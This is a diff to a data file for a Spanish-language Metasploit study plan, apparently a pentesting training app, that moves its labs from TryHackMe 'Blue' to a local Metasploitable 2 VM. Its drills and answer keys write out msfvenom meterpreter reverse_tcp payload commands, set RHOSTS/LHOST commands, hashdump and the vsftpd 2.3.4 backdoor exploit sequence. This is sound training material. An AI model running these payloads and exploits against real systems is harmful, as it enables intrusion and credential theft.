@@ -107,7 +107,7 @@ export const month1Week3: StudyWeek = {
         ],
       },
       practiceSteps: [
-        "Verifica tu propia IP (la que usarás como LHOST): ip a (o ifconfig tun0 si estás en VPN de THM/HTB)",
+        "Verifica tu propia IP Host-Only (LHOST): ip a | grep -A2 vboxnet ; o ip a y busca 192.168.56.",
         "En un módulo exploit con payload reverse, configura ambos: set RHOSTS <IP víctima>, set LHOST <TU IP>",
         "Configura el puerto local de escucha: set LPORT 4444",
         "Genera un payload standalone con msfvenom (ej. Linux ELF reverse TCP): msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TU IP> LPORT=4444 -f elf -o shell.elf",
@@ -115,9 +115,9 @@ export const month1Week3: StudyWeek = {
       ],
       subtopics: ["msf-lhost-lport", "msfvenom"],
       drills: [
-        { id: "d1", promptEs: "La víctima es 10.10.10.100 y tu IP de atacante (tun0) es 10.8.0.15. Escribe los DOS comandos 'set' necesarios (RHOSTS y LHOST) dentro de un módulo exploit ya seleccionado.", answer: "set RHOSTS 10.10.10.100 / set LHOST 10.8.0.15" },
-        { id: "d2", promptEs: "Escribe el comando msfvenom para generar un payload ELF (Linux) meterpreter reverse_tcp, con LHOST=10.8.0.15 y LPORT=4444, guardado como shell.elf.", answer: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.0.15 LPORT=4444 -f elf -o shell.elf" },
-        { id: "d3", promptEs: "Escribe el comando msfvenom para generar un payload .exe (Windows) meterpreter reverse_tcp, con LHOST=10.8.0.15 y LPORT=4444, guardado como shell.exe.", answer: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.15 LPORT=4444 -f exe -o shell.exe" },
+        { id: "d1", promptEs: "La víctima es 192.168.56.101 y tu IP de atacante (Host-Only) es 192.168.56.1. Escribe los DOS comandos set (RHOSTS y LHOST).", answer: "set RHOSTS 192.168.56.101 / set LHOST 192.168.56.1" },
+        { id: "d2", promptEs: "Escribe el comando msfvenom para generar un payload ELF (Linux) meterpreter reverse_tcp, con LHOST=192.168.56.1 y LPORT=4444, guardado como shell.elf.", answer: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf" },
+        { id: "d3", promptEs: "Escribe el comando msfvenom para generar un payload .exe (Windows) meterpreter reverse_tcp, con LHOST=192.168.56.1 y LPORT=4444, guardado como shell.exe.", answer: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe" },
       ],
       glossary: [
         { en: "reverse shell", es: "shell inversa (la víctima se conecta a ti)" },
@@ -159,7 +159,8 @@ export const month1Week3: StudyWeek = {
         { en: "session", es: "sesión" },
       ],
       resources: [
-        { label: "TryHackMe — Blue (EternalBlue + Metasploit, ideal para este bloque)", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
+        { label: "Metasploitable 2 — vsftpd 2.3.4 (módulo unix/ftp/vsftpd_234_backdoor)", url: "https://sourceforge.net/projects/metasploitable/files/Metasploitable2/", platform: "Local" },
+        { label: "TryHackMe — Blue (opcional, Windows/EternalBlue)", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
       ],
       closingChecklist: [
         "Configuré un multi/handler con el mismo payload/LHOST/LPORT que un msfvenom generado antes",
@@ -199,7 +200,7 @@ export const month1Week3: StudyWeek = {
       ],
       closingChecklist: [
         "Escribo sysinfo, getuid y hashdump sin ver apuntes",
-        "Ejecuté hashdump con éxito al menos una vez en un lab (THM Blue)",
+        "Ejecuté hashdump o, en Linux (MS2), documenté por qué hashdump SAM no aplica y usé sysinfo/getuid",
       ],
     },
     {
@@ -239,27 +240,24 @@ export const month1Week3: StudyWeek = {
       id: "m1-w3-b7",
       weekId: "m1-w3",
       order: 7,
-      title: "Skill-check Semana 3 + Lab de integración (Blue)",
-      objective: "Aprobar el skill-check de Metasploit (70%+) y comprometer completamente la máquina 'Blue' de TryHackMe usando el flujo completo aprendido.",
+      title: "Skill-check Semana 3 + Lab vsftpd (Metasploitable 2)",
+      objective: "Aprobar el skill-check de Metasploit (70%+) y explotar vsftpd 2.3.4 en Metasploitable 2 con el flujo search/use/set/exploit.",
       durationMin: 50,
       type: "checkpoint",
-      theoryEs: "Sin teoría nueva. Verificación de que el hueco #1 (Metasploit) está cerrado antes de entrar a explotación general en la Semana 4.",
+      theoryEs: "Sin teoría nueva. Target local: Metasploitable 2. EternalBlue/Blue es opcional si más adelante tienes una VM Windows legal.",
       practiceSteps: [
         "Toma el skill-check de la app (Simulacros > Skill-checks > Semana 3)",
-        "Completa la sala 'Blue' de TryHackMe de principio a fin usando SOLO Metasploit (search, use, set, exploit, sysinfo, getuid, hashdump)",
-        "Documenta cada comando que usaste en orden, como si fuera un mini-reporte",
-      ],
-      subtopics: ["msf-search-use", "msf-options", "msf-lhost-lport", "msf-sysinfo", "msf-hashdump", "msf-multihandler", "msfvenom"],
-      resources: [
-        { label: "TryHackMe — Blue", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
-      ],
-      extraResources: [
-        { label: "HackTheBox — Lame (retirada, gratis, Samba exploit clásico)", url: "https://app.hackthebox.com/machines/Lame", platform: "HackTheBox" },
+        "msfconsole → search vsftpd → use exploit/unix/ftp/vsftpd_234_backdoor → show options → set RHOSTS <IP MS2> → exploit",
+        "Documenta cada comando en orden. LHOST no es obligatorio en este módulo (bind); anota por qué",
       ],
       closingChecklist: [
         "Aprobé el skill-check de Semana 3 con 70% o más",
-        "Comprometí 'Blue' documentando cada comando en orden",
-        "Ya no dudo del set correcto de LHOST/LPORT/RHOSTS en ningún escenario nuevo",
+        "Comprometí vsftpd 2.3.4 en Metasploitable 2 documentando cada comando",
+        "Ya no dudo del set correcto de LHOST/LPORT/RHOSTS en un reverse payload",
+      ],
+      subtopics: ["msf-search-use", "msf-options", "msf-lhost-lport", "msf-sysinfo", "msf-hashdump", "msf-multihandler", "msfvenom"],
+      resources: [
+        { label: "Metasploitable 2 — vsftpd 2.3.4", url: "https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/", platform: "Local" },
       ],
     },
   ],
